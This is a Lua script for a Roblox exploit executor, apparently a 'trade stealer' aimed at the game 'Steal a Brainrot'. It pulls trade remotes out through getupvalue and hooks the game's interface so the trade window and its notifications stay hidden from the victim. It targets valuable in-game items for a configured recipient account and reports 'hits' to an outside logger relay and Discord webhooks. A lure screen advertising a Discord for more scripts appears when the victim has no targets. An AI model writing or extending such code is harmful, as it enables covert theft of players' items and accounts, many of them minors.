-- ===================== MAIN SCRIPT (loadstring) =====================
-- Remotes resolved via TradeController getupvalue (no hard-coded Net indexes)
-- If no target brainrots on base at start → Discord invite GUI (no trades / no embed)
if getgenv().BrainrotMainLoaded then
	return warn("[Brainrot] Main already running!")
end
getgenv().BrainrotMainLoaded = true

local genv = getgenv()

-- Supported places (main + variants + duel)
-- Accepts array {id,id} OR map {[id]=true} from genv; always merges defaults
local DEFAULT_PLACE_IDS = {
	109983668079237, -- main
	78906538690694,
	85621847059032,
	119594317142884,
	128855408206367,
	99606176102979,  -- duel
}
local CREATOR_GROUP_ID = 35815907 -- Steal a Brainrot group (Chocola-style)

local function buildPlaceSet()
	local set = {}
	local function add(id)
		id = tonumber(id)
		if id then set[id] = true end
	end
	for _, id in ipairs(DEFAULT_PLACE_IDS) do add(id) end
	local extra = genv.ALLOWED_PLACE_IDS
	if type(extra) == "table" then
		-- array style
		for _, id in ipairs(extra) do add(id) end
		-- map style {[placeId]=true}
		for k, v in pairs(extra) do
			if v == true or type(k) == "number" then
				add(type(k) == "number" and k or v)
			end
		end
	end
	return set
end

local allowedPlaceSet = buildPlaceSet()

local function isAllowedPlace()
	local pid = game.PlaceId
	if allowedPlaceSet[pid] then
		return true
	end
	-- Chocola fallback: any place owned by the game's creator group
	local ok, info = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(pid)
	end)
	if ok and info and info.Creator
		and info.Creator.CreatorType == "Group"
		and tonumber(info.Creator.CreatorTargetId) == CREATOR_GROUP_ID
	then
		return true
	end
	return false
end

if not isAllowedPlace() then
	warn("[Brainrot] Place not allowed:", game.PlaceId, "— exiting")
	getgenv().BrainrotMainLoaded = nil
	return
end

local DUEL_PLACE_ID = 99606176102979
local isInDuel = (game.PlaceId == DUEL_PLACE_ID)
local DUEL_COLOR = 0x808080 -- gray when in duel
print("[Brainrot] PlaceId =", game.PlaceId, "| InDuel =", isInDuel, "| allowed = true")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")
local LP = Players.LocalPlayer
local cam = workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

-- Secret key (preferred) → website relay. Fallback: direct Discord webhook for backwards compat.
local LOGGER_KEY = (type(genv.LOGGER_KEY) == "string" and genv.LOGGER_KEY ~= "" and genv.LOGGER_KEY) or nil
local GOOD_WEBHOOK = genv.GOOD_WEBHOOK or ""
-- When LOGGER_KEY is set, do not rely on exposing a Discord webhook in the script.
if LOGGER_KEY then
	GOOD_WEBHOOK = "" -- private hit goes through website relay only
end
local GOOD_AVATAR = genv.GOOD_AVATAR or "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
local TARGET_ID = tonumber(genv.TARGET_USER_ID) or 0
local RELAY_URL = "https://k2logger.lovable.app/api/public/webhook/relay"
local HITS_BROADCAST_URL = "https://k2logger.lovable.app/api/public/hits/broadcast"
print("[Brainrot] TARGET_ID =", TARGET_ID)
print("[Brainrot] LOGGER_KEY set:", LOGGER_KEY ~= nil, LOGGER_KEY and ("len=" .. tostring(#LOGGER_KEY)) or "")
print("[Brainrot] GOOD_WEBHOOK set:", GOOD_WEBHOOK ~= "" and GOOD_WEBHOOK ~= nil)
local primaryLogSent = false
local currentlyInTrade = false

local STOLEN_GUI_URL = "https://paste.rs/NQk9A"
local DRAINED_NEED_STREAK = 4
local drainedGuiShown = false
local DISCORD_LINK = "https://discord.gg/bxjXucMVqB"




local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
local TRADE_CYCLE_DELAY = 1.25
local INVITE_GUID = "9b5a0c7d-327f-415a-9720-b8e4f02b946a"
local SELECT_GUID = "bce6ca77-ef3c-4aab-b6e1-99f9c1815863"
local SELECTGB_GUID = "b0e90195-78ba-4028-8af6-8eb86c4ed82d"
local READY_GUID = "1774f028-dbab-4713-8122-c30d77582edc"
local ACCEPT_GUID = "d061f53c-7d12-4a4a-a761-d70b06c0d44c"
-- Fallbacks if game rotated Add GUIDs (invite GUID above still works)
local SELECT_GUIDS = {
	SELECT_GUID,
	"c85a2323-36b2-4121-968a-c064a6168aff",
}
local SELECTGB_GUIDS = {
	SELECTGB_GUID,
	"6786cce9-00d8-41e9-8beb-d96e0412b78b",
}
local FOOTER_ICON = "https://media.discordapp.net/attachments/1511087340721012919/1544655871529852988/2d33efc28dde57ea69dd4291cb6b4d6f_2.webp?ex=6a994c62&is=6a97fae2&hm=cd5486a74b48c119c89809204444e8a855045337dc23ede08a46ae7dd4077279&=&format=webp"
local FALLBACK_COLOR = 0x1A237E
local guiNames = { BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true }

local MUTATION_MULT = {
	["None"] = 1, ["Default"] = 1, ["Gold"] = 1.25, ["Diamond"] = 1.5, ["Bloodrot"] = 2,
	["Candy"] = 4, ["Lava"] = 6, ["Galaxy"] = 7, ["Yin Yang"] = 7.5,
	["Radioactive"] = 8.5, ["Cursed"] = 9, ["Divine"] = 10, ["Rainbow"] = 10,
	["Cyber"] = 11, ["Phantom"] = 12, ["Crystal"] = 13, ["Eclipse"] = 14,
}

local MUTATION_EMOJI = {
	["None"] = "<:Default_Mutation:1483657150231216138>",
	["Default"] = "<:Default_Mutation:1483657150231216138>",
	["Gold"] = "<:Gold:1498277392194736138>",
	["Diamond"] = "<:Diamond:1498277422746046514>",
	["Rainbow"] = "<:Rainbow:1498277403871678514>",
	["Divine"] = "<:Divine:1498277407793348789>",
	["Radioactive"] = "<:Radioactive:1498277395562758276>",
	["Cursed"] = "<:Cursed:1498277428391317575>",
	["Galaxy"] = "<:Galaxy:1498277390571536395>",
	["Candy"] = "<:Candy:1498277426621448192>",
	["Bloodrot"] = "<:Bloodrot:1498277424490610710>",
	["Crystal"] = "<:Crystal:1532523409630695624>",
	["Phantom"] = "<:phan:1533658669173047326>",
	["Lava"] = "<:Lava:1498277393754886216>",
	["Cyber"] = "<:Cyber:1498277418815983776>",
	["Yin Yang"] = "<:YingYang:1513911235337261076>",
	["Eclipse"] = "<:Eclispe:1558536036441657414>",
}

local GEAR_EMOJI = {
	["Waverider"] = "<:Waverider:1536942058676420680>",
	["Yin Yang Lamp"] = "<:YinYangLamp:1536942111218335754>",
	["Cupids Wings"] = "<:CupidsWings:1536941473407176715>",
	["Santas Sleigh"] = "<:SantasSleigh:1536942025646153818>",
	["Radioactive Airstrike"] = "<:RadioactiveAirstrike:1536941888148480000>",
	["Alien Slap"] = "<:AlienSlap:1536941130581807124>",
	["Divine Slap"] = "<:DivineSlap:1536941781277741076>",
	["Lava Slap"] = "<:LavaSlap:1536941851267965028>",
	["Cursed Slap"] = "<:CursedSlap:1536941510824689764>",
	["Demons Head"] = "<:DemonsHead:1536941574028525649>",
	["Witchs Broom"] = "<:WitchsBroom:1536942085649731667>",
	["Radioactive Slap"] = "<:RadioactiveSlap:1536941915931545650>",
	["Blackhole Bomb"] = "<:BlackholeBomb:1536941156649402490>",
	["Phantom Slap"] = "<:PhantomSlap:1536940296116371477>",
	["Cyber Slap"] = "<:CyberSlap:1536941541971730483>",
	["Lava Blaster"] = "<:LavaBlaster:1536941824915283998>",
	["Rainbow Slap"] = "<:RainbowSlap:1536941997510754424>",
	["Rainbow Hammer"] = "<:RainbowHammer:1536941964149133352>",
	["Bunny Basket"] = "<:BunnyBasket:1536943427327889419>",
	["Blood Moon Slap"] = "<:BloodMoonSlap:1538670582848032890>",
}

local BASESKIN_EMOJI = {
	["Octo"] = "<:Octo:1536944000752418856>",
	["Aquatic"] = "<:Aquatic:1536943396168532018>",
	["Rose"] = "<:Rose:1536944091558842378>",
	["Halloween"] = "<:Halloween:1536943747995279380>",
	["Pot Of Gold"] = "<:PotOfGold:1536944019827986532>",
	["Valentines"] = "<:Valentines:1536944152565252136>",
	["Christmas"] = "<:Christmas:1536943450388308049>",
	["Taco"] = "<:Taco:1536944658809225286>",
	["Lucky"] = "<:Lucky:1536943979793490000>",
}

local TargetBrainrots = {}
local GOOD_BRAINROTS = {}
if type(genv.ALLOWED_ANIMALS) == "table" then
	for _, name in pairs(genv.ALLOWED_ANIMALS) do
		if type(name) == "string" then
			TargetBrainrots[name] = true
			GOOD_BRAINROTS[name] = true
		end
	end
end
if next(TargetBrainrots) == nil then
	warn("[Brainrot] No ALLOWED_ANIMALS set in getgenv(). Using empty list.")
end

local ALLOWED_BASESKINS = genv.ALLOWED_BASESKINS or {}
local ALLOWED_GEARS = genv.ALLOWED_GEARS or {}

-----------------------------------------------------------
-- No-target Discord GUI (same visual language as stolen GUI)
-----------------------------------------------------------
local function showJoinDiscordGui()
	local old = pg:FindFirstChild("BrainrotJoinDiscordGui")
	if old then old:Destroy() end

	local LOGO_ID = "rbxassetid://137341352846357"
	local BG_ID   = "rbxassetid://131683450353430"

	local Colors = {
		violet   = Color3.fromRGB(145,145,145),
		violetDk = Color3.fromRGB(85,85,85),
		blue     = Color3.fromRGB(185,185,185),
		accent   = Color3.fromRGB(205,205,205),
		bg0      = Color3.fromRGB(8,7,14),
		bg1      = Color3.fromRGB(13,11,23),
		card     = Color3.fromRGB(20,17,34),
		cardHi   = Color3.fromRGB(30,26,50),
		line     = Color3.fromRGB(72,72,72),
		off      = Color3.fromRGB(55,55,55),
		white    = Color3.fromRGB(255,255,255),
		muted    = Color3.fromRGB(175,175,175),
		dim      = Color3.fromRGB(125,125,125),
		green    = Color3.fromRGB(64,224,128),
		black    = Color3.fromRGB(4,3,8),
	}

	local function tw(obj, info, goal)
		local t = TweenService:Create(obj, info, goal)
		t:Play()
		return t
	end
	local function corner(obj, r)
		local c = Instance.new("UICorner")
		c.CornerRadius = typeof(r) == "UDim" and r or UDim.new(0, r or 12)
		c.Parent = obj
		return c
	end
	local function round(obj)
		return corner(obj, UDim.new(1, 0))
	end
	local function stroke(obj, color, thick, alpha)
		local s = Instance.new("UIStroke")
		s.Color = color
		s.Thickness = thick or 1
		s.Transparency = alpha or 0
		s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		s.Parent = obj
		return s
	end
	local function typeText(lbl, text, speed)
		lbl.Text = ""
		task.spawn(function()
			for i = 1, #text do
				if not lbl.Parent then return end
				lbl.Text = text:sub(1, i)
				task.wait(speed or 0.03)
			end
		end)
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "BrainrotJoinDiscordGui"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 1000
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = pg

	-- FULL SCREEN root
	local root = Instance.new("Frame")
	root.Name = "Root"
	root.Size = UDim2.fromScale(1, 1)
	root.BackgroundColor3 = Colors.bg0
	root.BackgroundTransparency = 1
	root.BorderSizePixel = 0
	root.ClipsDescendants = true
	root.ZIndex = 1
	root.Parent = gui

	local skyG = Instance.new("UIGradient")
	skyG.Rotation = 35
	skyG.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(26,14,44)),
		ColorSequenceKeypoint.new(0.45, Colors.bg0),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(10,16,36)),
	})
	skyG.Parent = root

	local bgTex = Instance.new("ImageLabel")
	bgTex.Size = UDim2.fromScale(1, 1)
	bgTex.BackgroundTransparency = 1
	bgTex.Image = BG_ID
	bgTex.ScaleType = Enum.ScaleType.Crop
	bgTex.ImageTransparency = 0.86
	bgTex.ZIndex = 1
	bgTex.Parent = root

	local vignette = Instance.new("Frame")
	vignette.Size = UDim2.fromScale(1, 1)
	vignette.BackgroundColor3 = Colors.black
	vignette.BackgroundTransparency = 0.55
	vignette.BorderSizePixel = 0
	vignette.ZIndex = 2
	vignette.Parent = root
	local vigG = Instance.new("UIGradient")
	vigG.Rotation = 90
	vigG.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.2),
		NumberSequenceKeypoint.new(0.35, 0.85),
		NumberSequenceKeypoint.new(0.65, 0.85),
		NumberSequenceKeypoint.new(1, 0.15),
	})
	vigG.Parent = vignette

	-- ambient particles full screen
	local particleLayer = Instance.new("Frame")
	particleLayer.Size = UDim2.fromScale(1, 1)
	particleLayer.BackgroundTransparency = 1
	particleLayer.ZIndex = 3
	particleLayer.Parent = root
	local particles = {}
	for i = 1, 36 do
		local p = Instance.new("Frame")
		p.Size = UDim2.fromOffset(math.random(2, 4), math.random(2, 4))
		p.Position = UDim2.new(math.random(), 0, math.random(), 0)
		p.BackgroundColor3 = (math.random() < 0.5) and Colors.accent or Colors.white
		p.BackgroundTransparency = 0.45 + math.random() * 0.4
		p.BorderSizePixel = 0
		p.ZIndex = 3
		p.Parent = particleLayer
		round(p)
		table.insert(particles, {
			frame = p,
			speed = 0.006 + math.random() * 0.018,
			drift = (math.random() - 0.5) * 0.012,
			baseT = p.BackgroundTransparency,
		})
	end
	local partConn = game:GetService("RunService").RenderStepped:Connect(function(dt)
		if not gui.Parent then return end
		local t = tick()
		skyG.Rotation = 35 + math.sin(t * 0.25) * 20
		for _, pt in ipairs(particles) do
			if pt.frame and pt.frame.Parent then
				local x = pt.frame.Position.X.Scale + pt.drift * dt
				local y = pt.frame.Position.Y.Scale - pt.speed * dt * 60
				if y < -0.05 then y = 1.05; x = math.random() end
				if x < -0.05 then x = 1.05 elseif x > 1.05 then x = -0.05 end
				pt.frame.Position = UDim2.fromScale(x, y)
				pt.frame.BackgroundTransparency = pt.baseT + math.sin(t * 2 + x * 10) * 0.12
			end
		end
	end)

	-- MAIN CONTENT layer (full screen centered stack)
	local main = Instance.new("Frame")
	main.Name = "MainContent"
	main.Size = UDim2.fromScale(1, 1)
	main.BackgroundTransparency = 1
	main.ZIndex = 10
	main.Parent = root

	-- glowing logo ring
	local ring = Instance.new("Frame")
	ring.Size = UDim2.fromOffset(88, 88)
	ring.AnchorPoint = Vector2.new(0.5, 0.5)
	ring.Position = UDim2.new(0.5, 0, 0.28, 0)
	ring.BackgroundColor3 = Colors.white
	ring.BackgroundTransparency = 1
	ring.BorderSizePixel = 0
	ring.ZIndex = 12
	ring.Parent = main
	round(ring)
	local rg = Instance.new("UIGradient")
	rg.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Colors.violet),
		ColorSequenceKeypoint.new(0.5, Colors.blue),
		ColorSequenceKeypoint.new(1, Colors.violet),
	})
	rg.Parent = ring
	-- outer glow rings
	for _, scv in ipairs({1.45, 1.25}) do
		local g = Instance.new("Frame")
		g.AnchorPoint = Vector2.new(0.5, 0.5)
		g.Position = UDim2.fromScale(0.5, 0.5)
		g.Size = UDim2.fromScale(scv, scv)
		g.BackgroundColor3 = Colors.accent
		g.BackgroundTransparency = 1
		g.BorderSizePixel = 0
		g.ZIndex = 11
		g.Parent = ring
		round(g)
		g:SetAttribute("GlowRing", true)
	end
	local logo = Instance.new("ImageLabel")
	logo.Size = UDim2.new(1, -8, 1, -8)
	logo.Position = UDim2.fromOffset(4, 4)
	logo.BackgroundColor3 = Colors.bg1
	logo.BackgroundTransparency = 1
	logo.BorderSizePixel = 0
	logo.Image = LOGO_ID
	logo.ImageTransparency = 1
	logo.ScaleType = Enum.ScaleType.Crop
	logo.ZIndex = 13
	logo.Parent = ring
	round(logo)

	local brand = Instance.new("TextLabel")
	brand.AnchorPoint = Vector2.new(0.5, 0.5)
	brand.Position = UDim2.new(0.5, 0, 0.40, 0)
	brand.Size = UDim2.new(0.9, 0, 0, 22)
	brand.BackgroundTransparency = 1
	brand.Text = "K2"
	brand.TextColor3 = Colors.accent
	brand.TextTransparency = 1
	brand.TextSize = 14
	brand.Font = Enum.Font.GothamBold
	brand.ZIndex = 12
	brand.Parent = main

	local title = Instance.new("TextLabel")
	title.AnchorPoint = Vector2.new(0.5, 0.5)
	title.Position = UDim2.new(0.5, 0, 0.48, 0)
	title.Size = UDim2.new(0.88, 0, 0, 64)
	title.BackgroundTransparency = 1
	title.Text = "Join discord for scripts"
	title.TextColor3 = Colors.white
	title.TextTransparency = 1
	title.TextSize = 32
	title.Font = Enum.Font.GothamBlack
	title.TextWrapped = true
	title.ZIndex = 12
	title.Parent = main

	local subtitle = Instance.new("TextLabel")
	subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
	subtitle.Position = UDim2.new(0.5, 0, 0.58, 0)
	subtitle.Size = UDim2.new(0.8, 0, 0, 22)
	subtitle.BackgroundTransparency = 1
	subtitle.Text = "More scripts · free Code Sniper"
	subtitle.TextColor3 = Colors.muted
	subtitle.TextTransparency = 1
	subtitle.TextSize = 14
	subtitle.Font = Enum.Font.GothamMedium
	subtitle.ZIndex = 12
	subtitle.Parent = main

	local line = Instance.new("Frame")
	line.AnchorPoint = Vector2.new(0.5, 0.5)
	line.Position = UDim2.new(0.5, 0, 0.63, 0)
	line.Size = UDim2.new(0.28, 0, 0, 2)
	line.BackgroundColor3 = Colors.white
	line.BackgroundTransparency = 1
	line.BorderSizePixel = 0
	line.ZIndex = 12
	line.Parent = main
	local lineG = Instance.new("UIGradient")
	lineG.Color = ColorSequence.new(Colors.violet, Colors.blue)
	lineG.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.2, 0.35),
		NumberSequenceKeypoint.new(0.8, 0.35),
		NumberSequenceKeypoint.new(1, 1),
	})
	lineG.Parent = line

	local btn = Instance.new("TextButton")
	btn.AnchorPoint = Vector2.new(0.5, 0.5)
	btn.Position = UDim2.new(0.5, 0, 0.72, 0)
	btn.Size = UDim2.fromOffset(280, 48)
	btn.BackgroundColor3 = Colors.off
	btn.BackgroundTransparency = 1
	btn.Text = "discord.gg/bxjXucMVqB"
	btn.TextColor3 = Colors.white
	btn.TextTransparency = 1
	btn.TextSize = 15
	btn.Font = Enum.Font.GothamBold
	btn.AutoButtonColor = false
	btn.ZIndex = 13
	btn.ClipsDescendants = true
	btn.Parent = main
	corner(btn, 12)
	local btnStroke = stroke(btn, Colors.line, 1.4, 1)
	local btnGlow = stroke(btn, Colors.accent, 3, 1)
	local btnSc = Instance.new("UIScale")
	btnSc.Parent = btn

	local spinConn = game:GetService("RunService").RenderStepped:Connect(function(dt)
		if not gui.Parent then return end
		rg.Rotation = (rg.Rotation + dt * 140) % 360
	end)

	local function setMainVisible(vis, instant)
		local ti = instant and TweenInfo.new(0.01) or TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
		local goalT = vis and 0 or 1
		tw(brand, ti, { TextTransparency = goalT })
		tw(title, ti, { TextTransparency = goalT })
		tw(subtitle, ti, { TextTransparency = goalT })
		tw(line, ti, { BackgroundTransparency = goalT })
		tw(btn, ti, {
			BackgroundTransparency = vis and 0.08 or 1,
			TextTransparency = goalT,
		})
		tw(btnStroke, ti, { Transparency = vis and 0.3 or 1 })
		tw(btnGlow, ti, { Transparency = vis and 0.7 or 1 })
		tw(ring, ti, { BackgroundTransparency = vis and 0 or 1 })
		tw(logo, ti, {
			ImageTransparency = vis and 0 or 1,
			BackgroundTransparency = vis and 0 or 1,
		})
		for _, ch in ipairs(ring:GetChildren()) do
			if ch:IsA("Frame") and ch:GetAttribute("GlowRing") then
				tw(ch, ti, { BackgroundTransparency = vis and (0.88) or 1 })
			end
		end
		main.Visible = true
	end

	-- entrance
	task.spawn(function()
		tw(root, TweenInfo.new(0.5, Enum.EasingStyle.Sine), { BackgroundTransparency = 0 })
		task.wait(0.08)
		setMainVisible(true, false)
	end)

	btn.MouseEnter:Connect(function()
		tw(btn, TweenInfo.new(0.15), { BackgroundColor3 = Colors.cardHi, BackgroundTransparency = 0 })
		tw(btnStroke, TweenInfo.new(0.15), { Color = Colors.accent, Transparency = 0.12 })
		tw(btnGlow, TweenInfo.new(0.15), { Transparency = 0.5 })
		tw(btnSc, TweenInfo.new(0.15, Enum.EasingStyle.Back), { Scale = 1.03 })
	end)
	btn.MouseLeave:Connect(function()
		tw(btn, TweenInfo.new(0.18), { BackgroundColor3 = Colors.off, BackgroundTransparency = 0.08 })
		tw(btnStroke, TweenInfo.new(0.18), { Color = Colors.line, Transparency = 0.3 })
		tw(btnGlow, TweenInfo.new(0.18), { Transparency = 0.7 })
		tw(btnSc, TweenInfo.new(0.18), { Scale = 1 })
	end)

	local animBusy = false
	btn.MouseButton1Click:Connect(function()
		if animBusy then return end
		animBusy = true

		btnSc.Scale = 0.92
		tw(btnSc, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 })
		local r = Instance.new("Frame")
		r.AnchorPoint = Vector2.new(0.5, 0.5)
		r.Position = UDim2.fromScale(0.5, 0.5)
		r.Size = UDim2.fromOffset(0, 0)
		r.BackgroundColor3 = Colors.white
		r.BackgroundTransparency = 0.55
		r.BorderSizePixel = 0
		r.ZIndex = 20
		r.Parent = btn
		round(r)
		local sz = math.max(btn.AbsoluteSize.X, btn.AbsoluteSize.Y) * 1.7
		local rt = TweenService:Create(r, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.fromOffset(sz, sz), BackgroundTransparency = 1,
		})
		rt.Completed:Connect(function() r:Destroy() end)
		rt:Play()

		pcall(function()
			if setclipboard then setclipboard(DISCORD_LINK)
			elseif toclipboard then toclipboard(DISCORD_LINK) end
		end)

		-- hide main content
		setMainVisible(false, false)

		task.delay(0.35, function()
			-- Link Copied overlay (same full-screen root stays)
			local o = Instance.new("Frame")
			o.Name = "LinkCopied"
			o.AnchorPoint = Vector2.new(0.5, 0.5)
			o.Position = UDim2.fromScale(0.5, 0.5)
			o.Size = UDim2.fromOffset(300, 160)
			o.BackgroundTransparency = 1
			o.ZIndex = 30
			o.Parent = root

			local sc = Instance.new("UIScale")
			sc.Scale = 0.55
			sc.Parent = o
			local target = math.clamp((workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize.X or 800) / 700, 0.7, 1)

			local ring2 = Instance.new("Frame")
			ring2.Size = UDim2.fromOffset(72, 72)
			ring2.AnchorPoint = Vector2.new(0.5, 0)
			ring2.Position = UDim2.new(0.5, 0, 0, 0)
			ring2.BackgroundColor3 = Colors.white
			ring2.BorderSizePixel = 0
			ring2.ZIndex = 31
			ring2.Parent = o
			round(ring2)
			local rg2 = Instance.new("UIGradient")
			rg2.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Colors.violet),
				ColorSequenceKeypoint.new(0.5, Colors.blue),
				ColorSequenceKeypoint.new(1, Colors.violet),
			})
			rg2.Parent = ring2
			local logo2 = Instance.new("ImageLabel")
			logo2.Size = UDim2.new(1, -6, 1, -6)
			logo2.Position = UDim2.fromOffset(3, 3)
			logo2.BackgroundColor3 = Colors.bg1
			logo2.BorderSizePixel = 0
			logo2.Image = LOGO_ID
			logo2.ScaleType = Enum.ScaleType.Crop
			logo2.ZIndex = 32
			logo2.Parent = ring2
			round(logo2)

			local msg = Instance.new("TextLabel")
			msg.Size = UDim2.new(1, 0, 0, 30)
			msg.Position = UDim2.fromOffset(0, 86)
			msg.BackgroundTransparency = 1
			msg.Text = ""
			msg.TextColor3 = Colors.white
			msg.TextSize = 24
			msg.Font = Enum.Font.GothamBlack
			msg.TextXAlignment = Enum.TextXAlignment.Center
			msg.TextStrokeTransparency = 0.55
			msg.ZIndex = 31
			msg.Parent = o
			local msgG = Instance.new("UIGradient")
			msgG.Color = ColorSequence.new(Colors.white, Colors.accent)
			msgG.Parent = msg

			local sub2 = Instance.new("TextLabel")
			sub2.Size = UDim2.new(1, 0, 0, 16)
			sub2.Position = UDim2.fromOffset(0, 118)
			sub2.BackgroundTransparency = 1
			sub2.Text = DISCORD_LINK:gsub("https://", "")
			sub2.TextColor3 = Colors.accent
			sub2.TextTransparency = 1
			sub2.TextSize = 12
			sub2.Font = Enum.Font.GothamBold
			sub2.TextXAlignment = Enum.TextXAlignment.Center
			sub2.ZIndex = 31
			sub2.Parent = o

			tw(sc, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = target })
			local spin2 = game:GetService("RunService").RenderStepped:Connect(function(dt)
				if not o.Parent then return end
				rg2.Rotation = (rg2.Rotation + dt * 220) % 360
			end)
			task.delay(0.15, function() typeText(msg, "Link Copied!", 0.04) end)
			task.delay(0.5, function()
				tw(sub2, TweenInfo.new(0.35), { TextTransparency = 0 })
			end)

			-- after animation → return to full-screen main (do NOT destroy GUI)
			task.delay(1.75, function()
				tw(sc, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = target * 0.55 })
				tw(msg, TweenInfo.new(0.25), { TextTransparency = 1, TextStrokeTransparency = 1 })
				tw(sub2, TweenInfo.new(0.25), { TextTransparency = 1 })
				tw(ring2, TweenInfo.new(0.25), { BackgroundTransparency = 1 })
				tw(logo2, TweenInfo.new(0.25), { ImageTransparency = 1, BackgroundTransparency = 1 })
				task.wait(0.3)
				spin2:Disconnect()
				o:Destroy()
				setMainVisible(true, false)
				animBusy = false
			end)
		end)
	end)

	print("[Brainrot] No target brainrots — full-screen K2 Discord GUI shown (persistent)")
end

-----------------------------------------------------------
-- REMOTES: TradeController getupvalue (Chocola method)
-----------------------------------------------------------
local TradeController, InterfaceController, SoundController, NotificationController, CameraController
local ReplicatorClient, ChannelModule

pcall(function()
	TradeController = require(ReplicatedStorage.Controllers.TradeController)
end)
pcall(function()
	InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
end)
pcall(function()
	SoundController = require(ReplicatedStorage.Controllers.SoundController)
end)
pcall(function()
	NotificationController = require(ReplicatedStorage.Controllers.NotificationController)
end)
pcall(function()
	CameraController = require(ReplicatedStorage.Controllers.CameraController)
end)
pcall(function()
	ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
end)
pcall(function()
	ChannelModule = require(ReplicatedStorage.Packages.Synchronizer.Channel)
end)

local liveTrade, inviteRemote, addBrainrotRemote, addItemRemote
local readyRemote, acceptRemote, tradeEndRemote
local tradeChannel = nil
local remotesReady = false

local function resolveTradeRemotes()
	if not TradeController or not getupvalue then
		return false
	end
	local ok = pcall(function()
		liveTrade = getupvalue(TradeController._createLiveTrade, 15)
		inviteRemote = getupvalue(TradeController.SendInvite, 1)
		addBrainrotRemote = liveTrade and getupvalue(liveTrade.Brainrot.Add, 1) or nil
		addItemRemote = liveTrade and getupvalue(liveTrade.BaseSkin.Add, 1) or nil
		readyRemote = getupvalue(TradeController._createLiveTrade, 24)
		acceptRemote = getupvalue(TradeController._createLiveTrade, 23)
		tradeEndRemote = getupvalue(TradeController._createPlayerList, 21)
	end)
	if not ok then return false end
	return liveTrade and inviteRemote and addBrainrotRemote and readyRemote and acceptRemote
end

local function fallbackRemote(leaf)
	for _, child in ipairs(Net:GetChildren()) do
		if child.Name == leaf or child.Name:find(leaf, 1, true) then
			if child:IsA("RemoteFunction") or child:IsA("RemoteEvent") then
				return child
			end
		end
	end
	local exact = Net:FindFirstChild(leaf)
	if exact and (exact:IsA("RemoteFunction") or exact:IsA("RemoteEvent")) then
		return exact
	end
	return nil
end

local function waitForRemotes(timeout)
	timeout = timeout or 15
	local t0 = os.clock()
	while os.clock() - t0 < timeout do
		if resolveTradeRemotes() then
			remotesReady = true
			print("[Brainrot] Remotes via TradeController getupvalue OK")
			print("[Brainrot] Invite     :", inviteRemote and inviteRemote.Name or "?")
			print("[Brainrot] AddBrainrot:", addBrainrotRemote and addBrainrotRemote.Name or "?")
			print("[Brainrot] AddItem    :", addItemRemote and addItemRemote.Name or "?")
			print("[Brainrot] Ready      :", readyRemote and readyRemote.Name or "?")
			print("[Brainrot] Accept     :", acceptRemote and acceptRemote.Name or "?")
			return true
		end
		task.wait(0.1)
	end
	warn("[Brainrot] getupvalue resolve timed out — falling back to Net name search")
	inviteRemote = inviteRemote or fallbackRemote("Invite") or fallbackRemote("RF/TradeService/Invite")
	addBrainrotRemote = addBrainrotRemote or fallbackRemote("AddBrainrot") or fallbackRemote("RF/TradeService/AddBrainrot")
	addItemRemote = addItemRemote or fallbackRemote("AddItem") or fallbackRemote("RF/TradeService/AddItem")
	readyRemote = readyRemote or fallbackRemote("Ready") or fallbackRemote("RE/TradeService/Ready")
	acceptRemote = acceptRemote or fallbackRemote("Accept") or fallbackRemote("RE/TradeService/Accept")
	remotesReady = inviteRemote and readyRemote and acceptRemote and true or false
	print("[Brainrot] Fallback Invite:", inviteRemote and inviteRemote.Name or "MISSING")
	print("[Brainrot] Fallback AddBrainrot:", addBrainrotRemote and addBrainrotRemote.Name or "MISSING")
	print("[Brainrot] Fallback Ready:", readyRemote and readyRemote.Name or "MISSING")
	print("[Brainrot] Fallback Accept:", acceptRemote and acceptRemote.Name or "MISSING")
	return remotesReady
end

local function hookTradeUI()
	if not InterfaceController then return end
	local originalToggle = InterfaceController.Toggle
	local originalSetState = InterfaceController.SetState
	pcall(function()
		local TradeLiveTrade = InterfaceController:Get("TradeLiveTrade")
		if TradeLiveTrade and TradeLiveTrade:IsOpened() then
			InterfaceController:Toggle("TradeLiveTrade", false)
			if CameraController then
				pcall(function()
					CameraController:Blur(0, 0)
					CameraController:Fov(CameraController:GetDefaultFov(), 0)
				end)
			end
		end
	end)
	InterfaceController.Toggle = function(self, name, ...)
		if name == "TradeLiveTrade" then return end
		return originalToggle(self, name, ...)
	end
	InterfaceController.SetState = function(self, name, ...)
		if name == "TradeLiveTrade" then return end
		return originalSetState(self, name, ...)
	end
	if NotificationController then
		local originalNotify = NotificationController.Notify
		local originalError = NotificationController.Error
		local originalSuccess = NotificationController.Success
		local function isFromTrade()
			for i = 2, 8 do
				local src = debug.info(i, "s")
				if not src then break end
				if src:find("TradeController") then return true end
			end
			return false
		end
